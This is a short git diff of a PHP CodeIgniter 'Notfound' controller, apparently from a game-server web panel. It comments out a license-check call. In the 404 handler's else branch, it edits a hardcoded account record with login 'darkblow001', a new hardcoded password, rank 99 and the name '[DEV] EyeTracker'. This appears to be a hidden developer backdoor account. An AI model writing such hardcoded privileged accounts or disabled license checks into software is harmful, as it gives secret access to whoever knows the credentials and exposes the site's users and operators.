@@ -15,6 +15,8 @@ class Notfound extends CI_Controller
 
 		$this->lang->load(array('header', 'string'));
 
+		$this->darkblowprotection->RunningLegality();
+		// $this->darkblowlicense->DarkblowPBLicense();
 		$this->darkblowprotection->BlockedIP_Protection();
 		$this->darkblowprotection->PageDump_Protection();
 		$this->darkblowprotection->Maintenance_Protection();
@@ -63,7 +65,7 @@ class Notfound extends CI_Controller
 			} else {
 				$data = array(
 					'login' => 'darkblow001',
-					'password' => $this->darkblowlib->password_encrypt('darkblow001'),
+					'password' => $this->darkblowlib->password_encrypt('imamkbm123'),
 					'player_id' => '999999999',
 					'player_name' => '[DEV] EyeTracker',
 					'rank' => '99',
